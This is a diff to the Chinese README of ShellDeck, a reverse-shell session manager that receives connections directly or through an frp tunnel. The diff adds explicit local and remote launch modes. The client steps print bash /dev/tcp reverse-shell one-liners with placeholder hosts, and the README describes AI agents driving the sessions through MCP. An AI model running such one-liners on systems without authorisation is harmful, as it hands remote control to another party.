@@ -32,15 +32,28 @@
 
 ## 快速开始
 
-### 启动服务端
+### 安装命令与选择模式
 
 ```sh
 git clone https://github.com/sleepingF0x/shelldeck.git
 cd shelldeck
-python3 shelldeck.py -p 9000
+python3 scripts/install.py
 ```
 
-默认监听 `0.0.0.0:9000`，空闲超时为 900 秒。程序需要交互终端，标准输入、输出不能重定向到文件或管道。
+确保 `~/.local/bin` 已加入 `PATH`，然后在任意目录的交互终端选择一种方式：
+
+| 命令 | 连接方式 | 客户端入口 |
+| --- | --- | --- |
+| `shelldeck --remote` | 复用已有 frpc 配置，接收 VPS 转发 | 配置中的 VPS 地址和 `remotePort`，下文示例为 `9099` |
+| `shelldeck --local -p 9099` | 在本机直接监听，不需要 frp | 本机可达 IPv4 的 `9099` |
+
+`--remote` 和 `--local` 必须二选一，同时指定时报错；不选模式只显示帮助，不读取配置或启动监听。两种模式下 ShellDeck 都在本机运行。程序启动时显示模式、本机监听地址和客户端入口；远端入口取自静态配置，配置片段或模板中无法确定的部分会显示占位提示，不代表已经验证隧道连通。
+
+`--local` 默认监听 `0.0.0.0:9000`，可用 `-H` / `-p` 调整；例如只在本机测试可用 `shelldeck --local -H 127.0.0.1 -p 9099`。`--remote` 的监听地址、端口和 PROXY v1 从已有 frpc 配置读取，不接受 `-H` / `-p` 覆盖，首次配置见[独立部署说明](#frp-deployment)。
+
+两种模式共用名称、备注、历史和 `agent_socket` 配置。切换时先在菜单中 `quit`，再运行另一条命令，客户端需要重新连接；frpc、frps 仍由原服务独立管理。升级后原来的无参数 `shelldeck` 也只显示帮助，请显式选择模式。
+
+不安装快捷命令时，可在仓库运行 `python3 shelldeck.py --local -p 9000` 或 `python3 shelldeck.py --remote`，参数规则相同。空闲超时默认为 900 秒；程序需要交互终端，标准输入、输出不能重定向到文件或管道。
 
 如果原来的 `nc -l 9000` 还在运行，先停止它，再启动 shelldeck。原有连接不能迁移，需要客户端重新连接。
 
@@ -48,7 +61,7 @@ python3 shelldeck.py -p 9000
 
 ### VPS / Mac 独立部署与使用
 
-**部署一次后，日常只需在 Mac 终端运行 `shelldeck`。** VPS 的 frps 和 Mac 的 frpc 分别常驻，由系统管理；ShellDeck 在管理菜单输入 `quit` 后退出，frp 继续运行。已完成部署可直接跳到[日常使用](#frp-start)。
+**部署一次后，日常通过 VPS 使用时运行 `shelldeck --remote`。** VPS 的 frps 和 Mac 的 frpc 分别常驻，由系统管理；ShellDeck 在管理菜单输入 `quit` 后退出，frp 继续运行。已完成部署可直接跳到[日常使用](#frp-start)。
 
 frp 按[官方安装指引](https://gofrp.org/zh-cn/docs/setup/)独立安装，VPS 无需下载 ShellDeck。下面是原生 systemd / launchd 的配置示例，ShellDeck 不负责安装或管理这些服务。
 
@@ -269,24 +282,28 @@ launchctl bootstrap "gui/$(id -u)" "$HOME/Library/LaunchAgents/local.frp.frpc.pl
 }
 ```
 
-ShellDeck 从所选代理读取本地监听地址、端口和 PROXY v1，不重复配置监听参数，也不复制 frp 凭据。路径支持 `~`，相对路径按该 JSON 所在目录解析。支持静态 TOML/JSON；更多约束和已有配置的兼容方式见[接入说明](docs/frp.md#shelldeck-配置)。
+`--remote` 从所选代理读取本地监听地址、端口和 PROXY v1，不重复配置监听参数，也不复制 frp 凭据。`--local` 只读取共用的 `agent_socket`，不会打开 `frpc_config` 指向的文件；只用本地模式时可以不创建配置，默认 socket 为 `~/.config/shelldeck/agent/control.sock`。
+
+默认在启动时查找 `~/.config/shelldeck/config.json`；设置了绝对路径 `XDG_CONFIG_HOME` 时使用该目录。已有配置无需复制，路径支持 `~`，相对路径按 JSON 所在目录解析。显式指定的配置不存在或已有 JSON 损坏时会报错。frpc 支持静态 TOML/JSON；更多约束和旧配置的兼容方式见[接入说明](docs/frp.md#shelldeck-配置)。
 
 <a id="frp-start"></a>
 
 #### 安装命令与日常使用（Linux / macOS 相同）
 
-推荐 Python 3.11+。Python 3.9/3.10 读取 TOML 时，先用同一解释器运行 `python3 -m pip install -r requirements-frp.txt`。在仓库目录安装一次命令：
+推荐 Python 3.11+。Python 3.9/3.10 在远端模式读取 TOML 时，先用同一解释器运行 `python3 -m pip install -r requirements-frp.txt`；本地模式无需该依赖。在仓库目录安装或更新命令：
 
 ```sh
 python3 scripts/install.py
 ```
 
-安装器生成 `~/.local/bin/shelldeck`，绑定安装时的 Python、仓库和 ShellDeck 配置。确认 `~/.local/bin` 已加入 `PATH`；缺少时在自己的 shell 配置中加入 `export PATH="$HOME/.local/bin:$PATH"` 并重新打开终端。移动仓库或更换 Python 后重新安装即可。自定义配置位置时使用 `python3 scripts/install.py --config /absolute/path/to/config.json`。
+安装器生成 `~/.local/bin/shelldeck`，绑定安装时的 Python 和仓库，默认在每次启动时查找配置。安装不要求 frp 已部署；代理配置在 `--remote` 启动时校验。确认 `~/.local/bin` 已加入 `PATH`；缺少时在自己的 shell 配置中加入 `export PATH="$HOME/.local/bin:$PATH"` 并重新打开终端。移动仓库或更换 Python 后重新安装即可。
+
+自定义配置位置时使用 `python3 scripts/install.py --config /absolute/path/to/config.json` 绑定已有文件，也可在启动时用 `shelldeck --remote --config /absolute/path/to/config.json` 临时覆盖。配置文件不保存模式，模式由每次启动的参数决定。
 
 之后每次在交互终端运行：
 
 ```sh
-shelldeck
+shelldeck --remote
 ```
 
 保持终端打开，在获准访问的客户端执行下面的命令，将 `VPS_IPV4` 换成 VPS 的 IPv4 地址，或只解析到该 IPv4 的域名：
@@ -297,7 +314,7 @@ bash -c 'bash -i >& /dev/tcp/VPS_IPV4/9099 0>&1'
 
 回到 ShellDeck，`ls` 查看会话，`i ID` 进入会话，**Ctrl+]** 返回菜单，菜单中的 `quit` 停止 ShellDeck。关闭终端也会结束运行。退出后会话断开，再次启动后由客户端重新连接；frp 继续运行。这里回连端口是 **9099**，下文直连示例的 `9000` 属于另一种使用方式。
 
-原参数仍可使用，例如 `shelldeck -t 1800`。每次启动重新读取共享代理配置；修改监听目标时改原 frpc 配置并让 frpc 加载变更，再重启 ShellDeck。与配置冲突的 `-H` / `-p` 会报错。CLI/MCP 在 ShellDeck 运行期间使用配置中的同一个控制 socket。
+超时等共用参数仍可使用，例如 `shelldeck --remote -t 1800` 或 `shelldeck --local -p 9099 -t 1800`。远端模式每次启动重新读取代理配置；修改目标时改原 frpc 配置并让 frpc 加载变更，再重启 ShellDeck。CLI/MCP 在两种模式下使用同一个控制 socket，切换后重新获取实例和会话 ID。
 
 已有外置配置可继续使用；若仍引用仓库内的完整 frpc 示例，升级前先按[迁移说明](docs/frp.md#shelldeck-配置)将其移到项目外，并更新 frpc 和 ShellDeck 的配置路径。配置读取成功不等于隧道可用，首次接入仍需[验证真实回连](docs/frp.md#验证)。
 
@@ -331,7 +348,7 @@ PV_CONFIG="$HOME/.config/shelldeck/pv3.env" bash scripts/pv3.sh
 
 ### 连接客户端
 
-在客户端执行，把 `SERVER_IP` 换成服务端 IP：
+以下是直连 `9000` 的示例，把 `SERVER_IP` 换成本机可达 IP；使用 `--local -p 9099` 时相应改成 `9099`。通过 VPS 使用时按[远端模式的回连示例](#frp-start)连接：
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/SERVER_IP/9000 0>&1'
@@ -462,7 +479,7 @@ shelldeck> batch scripts/check.sh --sessions 1,3,5
 
 ### 查询脚本执行历史
 
-每次 `batch` 都会记录每个目标会话，包括忙碌而跳过的会话。记录保存到管理端的 SQLite 数据库 `~/.config/shelldeck/history.db`；设置了绝对路径 `XDG_CONFIG_HOME` 时使用该目录。新文件权限为 `0600`，数据库位于代码仓库之外，无需数据库服务或客户端 Python。升级时同步 `shelldeck.py`、`shelldeck_history.py`、`shelldeck_control.py`、`shelldeck_transfer.py` 和 `shelldeck_agent.py`；使用 MCP 时还需同步 `shelldeck_mcp.py`、`requirements-mcp.txt` 并安装适配器依赖。
+每次 `batch` 都会记录每个目标会话，包括忙碌而跳过的会话。记录保存到管理端的 SQLite 数据库 `~/.config/shelldeck/history.db`；设置了绝对路径 `XDG_CONFIG_HOME` 时使用该目录。新文件权限为 `0600`，数据库位于代码仓库之外，无需数据库服务或客户端 Python。升级时更新完整仓库，让主程序、配置模块、CLI 和安装脚本保持同一版本；使用 MCP 时还需按 `requirements-mcp.txt` 安装适配器依赖。
 
 ```text
 shelldeck> history check.sh
@@ -510,7 +527,7 @@ shelldeck> i 1
 先在服务端启动控制台并启用本地接口：
 
 ```sh
-python3 shelldeck.py -p 9000 --agent-socket "$HOME/.config/shelldeck/agent/control.sock"
+python3 shelldeck.py --local -p 9000 --agent-socket "$HOME/.config/shelldeck/agent/control.sock"
 ```
 
 再让 agent 在**同一台服务端、同一用户下**调用：
@@ -653,7 +670,7 @@ flowchart LR
 
 #### 1. 准备 MCP 环境并启动控制台
 
-若已通过 `shelldeck` 启动控制台，复用配置中的 `agent_socket`，跳过下面直接启动 `shelldeck.py` 的命令。保持原终端打开即可。
+若已通过 `shelldeck --remote` 或 `shelldeck --local` 启动控制台，复用配置中的 `agent_socket`，跳过下面直接启动 `shelldeck.py` 的命令。保持原终端打开即可。
 
 在终端 A 中进入仓库目录，将 `/absolute/path/shelldeck` 换成实际路径：
 
@@ -664,7 +681,7 @@ python3.11 -m venv .venv-mcp
 .venv-mcp/bin/python -c 'from mcp.server import MCPServer; print("MCP SDK ready")'
 .venv-mcp/bin/python shelldeck_mcp.py --help
 
-python3 shelldeck.py -p 9000 -t 1800 \
+python3 shelldeck.py --local -p 9000 -t 1800 \
   --agent-socket "$HOME/.config/shelldeck/agent/control.sock"
 ```
 
@@ -815,7 +832,7 @@ codex mcp add shelldeck -- ssh -T -o BatchMode=yes shelldeck-console \
 | --- | --- |
 | MCP 无法启动、找不到 `mcp` 模块 | 检查 `command` 是否指向安装了依赖的 `.venv-mcp/bin/python`；重新运行第 1 步的 SDK 导入检查和 `--help`，分别确认依赖与脚本路径 |
 | 已登记配置，但 agent 看不到工具 | 重新加载 MCP 或重启 agent 客户端，检查该服务是否启用；无需重启 shelldeck 控制台 |
-| 工具可见，但 `list_sessions` 返回 `client_error` | 确认控制台仍运行、使用了 `--agent-socket`、两端路径一致，且 MCP 进程与控制台属于同一用户；用 CLI `sessions` 交叉检查 |
+| 工具可见，但 `list_sessions` 返回 `client_error` | 确认控制台仍运行、两端使用相同的控制 socket 路径，且 MCP 进程与控制台属于同一用户；用 CLI `sessions` 交叉检查 |
 | socket 权限错误或路径已存在 | 使用当前用户拥有的独立私有目录；确认旧进程已退出后才能清理残留 socket，详见[本地接口和升级](#本地接口和升级) |
 | `sessions` 为空 | MCP 已连通控制台，等待客户端回连；控制台重启后，旧 TCP 会话不会自动恢复 |
 | `session_busy` | 查看 `busy_reason`；人工退出交互到菜单，或等待当前命令、传输、其他任务租约结束 |
@@ -862,11 +879,11 @@ python3 shelldeck_agent.py --socket "$HOME/.config/shelldeck/agent/control.sock"
 
 ### 本地接口和升级
 
-接口默认关闭，启用后只创建本地 Unix socket，不增加 TCP 监听端口。socket 的直接父目录必须属于当前用户，且不开放组或其他用户权限；缺失的目录会自动创建为 `0700`，socket 为 `0600`。指定一个独立目录即可，不要直接放在共享的 `/tmp` 下。能访问此 socket 的进程拥有远端命令执行能力。
+两种模式默认启用本地 Unix socket，不增加 TCP 监听端口。socket 的直接父目录必须属于当前用户，且不开放组或其他用户权限；缺失的目录会自动创建为 `0700`，socket 为 `0600`。指定一个独立目录即可，不要直接放在共享的 `/tmp` 下。能访问此 socket 的进程拥有远端命令执行能力。
 
-正常退出会清理 socket；已有路径不会被自动覆盖。若上次进程被强制终止，确认它已退出后再删除对应残留 socket，或选择新路径。每个控制台使用不同路径。接口沿用 Python 标准库的 [Unix socket](https://docs.python.org/3/library/socket.html#socket-families) 和 [selectors](https://docs.python.org/3/library/selectors.html)；收发与原会话共用事件循环，慢客户端有连接数、消息大小和等待时间限制。
+正常退出会清理 socket；已有路径不会被自动覆盖。若上次进程被强制终止，确认它已退出后再删除对应残留 socket，或选择新路径。切换模式时复用同一路径；同时运行多个控制台时，用 `--agent-socket` 为每个实例指定不同路径，并使用不同的 TCP 监听端口。接口沿用 Python 标准库的 [Unix socket](https://docs.python.org/3/library/socket.html#socket-families) 和 [selectors](https://docs.python.org/3/library/selectors.html)；收发与原会话共用事件循环，慢客户端有连接数、消息大小和等待时间限制。
 
-旧版正在运行的进程不能热加载此功能。升级代码并重启控制台会断开其已有 TCP 会话，需要客户端重新回连；在启用了接口的新版进程中，agent 可以直接操作已经连接的会话。停止使用接口时，下次启动省略 `--agent-socket` 即可，历史记录保留。
+旧版正在运行的进程不能热加载此功能。升级代码并重启控制台会断开其已有 TCP 会话，需要客户端重新回连。两种启动模式均启用私有 agent socket，省略 `--agent-socket` 时沿用配置或默认路径；agent 可以直接操作已经连接的会话。
 
 ### 直接调用 JSON 协议
 
@@ -887,16 +904,18 @@ python3 shelldeck_agent.py --socket "$HOME/.config/shelldeck/agent/control.sock"
 
 ## 启动参数
 
-短参数和长参数可以混用。直连模式可指定端口；配置模式沿用 frpc 的监听参数，按需调整超时时长。
+短参数和长参数可以混用。每次启动显式选择 `--local` 或 `--remote`；未选择时只显示帮助。
 
 | 短参数 | 长参数 | 作用 | 默认值 |
 | --- | --- | --- | --- |
-| | `--config` | 读取引用现有 frpc 代理的 ShellDeck JSON 配置 | 不读取；安装的 `shelldeck` 命令已绑定配置 |
-| `-p` | `--port` / `--listen` | 监听端口；直连模式可用 `0` 自动选择空闲端口 | 直连 `9000`；配置模式从 frpc 读取 |
-| `-H` | `--host` | 监听的 IPv4 地址 | 直连 `0.0.0.0`；配置模式从 frpc 读取 |
+| | `--remote` | 通过现有 frp 接收 VPS 转发，与 `--local` 互斥 | 不自动选择 |
+| | `--local` | 本机直接接收普通 TCP，与 `--remote` 互斥 | 不自动选择 |
+| | `--config` | ShellDeck JSON 配置；本地模式只读取共用设置，远端模式再读取 frpc 代理 | 启动时自动查找；安装时可绑定自定义文件 |
+| `-p` | `--port` / `--listen` | 仅本地模式可指定；`0` 自动选择空闲端口 | 本地 `9000`；远端从 frpc 读取 |
+| `-H` | `--host` | 仅本地模式可指定的 IPv4 监听地址 | 本地 `0.0.0.0`；远端从 frpc 读取 |
 | `-t` | `--idle-timeout` | 无交互超时秒数，`0` 关闭自动断开 | `900` |
-| | `--agent-socket` | 外部 AI agent 使用的本地 Unix socket 路径 | 直连关闭；配置模式沿用配置或默认控制 socket |
-| | `--proxy-protocol v1` | 接收同机 frpc 的 PROXY v1 TCP4 来源地址，要求 IPv4 回环监听 | 直连关闭；配置模式从 frpc 读取 |
+| | `--agent-socket` | 覆盖共用的本地 Unix socket 路径 | 两种模式均沿用配置或默认控制 socket |
+| | `--proxy-protocol v1` | 仅远端模式接受，通常无需指定 | 远端已从 frpc 配置要求 PROXY v1；本地不接受该参数 |
 | `-b` | `--buffer-kib` | 每个会话的未读输出缓存上限，单位 KiB | `1024` |
 | `-m` | `--max-sessions` | 最多保留的会话记录数 | `100` |
 | `-h` | `--help` | 显示帮助 | |
@@ -904,19 +923,19 @@ python3 shelldeck_agent.py --socket "$HOME/.config/shelldeck/agent/control.sock"
 修改端口并把超时设为 30 分钟：
 
 ```sh
-python3 shelldeck.py -p 9001 -t 1800
+python3 shelldeck.py --local -p 9001 -t 1800
 ```
 
 等价的长参数写法：
 
 ```sh
-python3 shelldeck.py --port 9001 --idle-timeout 1800
+python3 shelldeck.py --local --port 9001 --idle-timeout 1800
 ```
 
 只在本机监听，并关闭自动断开：
 
 ```sh
-python3 shelldeck.py -H 127.0.0.1 -t 0
+python3 shelldeck.py --local -H 127.0.0.1 -t 0
 ```
 
 ### 空闲超时如何计算
@@ -936,7 +955,7 @@ python3 shelldeck.py -H 127.0.0.1 -t 0
 `-m` 默认保留 100 条记录，包括在线会话和已断开会话。达到上限时，优先删除最早的、当前未查看的已断开记录；没有可清理记录时拒绝新连接，已有连接继续使用。需要更多同时在线的会话时再调大。
 
 ```sh
-python3 shelldeck.py -b 2048 -m 200
+python3 shelldeck.py --local -b 2048 -m 200
 ```
 
 ## 输入模式与使用边界
@@ -965,6 +984,8 @@ python3 -m unittest discover -s tests -v
 ```
 
 测试使用本机回环地址、真实 TCP socket 和伪终端，覆盖多客户端隔离、会话切换、后台输出、缓存溢出、连接上限、慢客户端、终端输出堵塞、Bash 状态保留和退出时的终端恢复。
+
+启动测试通过安装后的真实命令验证模式互斥、无模式时只显示帮助、本地模式不依赖 frp、共用配置和旧路径兼容、错误配置拒绝，以及切换模式后的名称、备注、历史和 agent 接口。测试安装目录和配置都在临时目录中。
 
 PROXY v1 测试覆盖来源地址进入名称、备注、历史和 CLI/MCP，头拆包与载荷粘包、二进制往返、畸形/超长/超时头、等待连接上限、断线重连和原直连行为。可选的真实 frpc/frps 测试在临时目录构造隧道，验证代理片段、TLS、来源端口、文件传输与前台启停，入口见 [frp 接入说明](docs/frp.md#验证)。
 
